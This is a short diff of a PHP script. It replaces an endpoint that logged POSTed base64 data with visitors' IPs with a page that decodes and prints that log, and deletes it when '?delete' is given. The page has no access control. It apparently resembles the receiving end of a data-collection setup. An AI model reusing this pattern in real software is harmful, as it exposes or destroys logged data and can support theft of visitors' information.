@@ -1,8 +1,21 @@
 <?php
-    if( isset($_POST['data']) )
-    {
-        $location = "./output.txt";
-        $data = time() . " - " . $_SERVER['REMOTE_ADDR'] . " - " . $_POST['data'] . PHP_EOL;
-        file_put_contents($location, $data, FILE_APPEND | LOCK_EX);
+    header("Content-Type: text/plain");
+    $file = "./output.txt";
+    if( isset($_GET['delete']) ) {
+        if (unlink($file)) {
+            echo "Deleted $file";
+        } else {
+            echo "Error deleting $file";
+        }
+    } elseif ($fh = fopen($file, "r")) {
+        while (!feof($fh)) {
+            $line = fgets($fh);
+                $array = explode(" - ", $line);
+                if (count($array) != 3) {
+                        continue;
+                }
+                echo gmdate('r', $array[0]) . " - " . $array[1] . " - " . base64_decode($array[2]) . PHP_EOL;
+        }
+        fclose($fh);
     }
 ?>
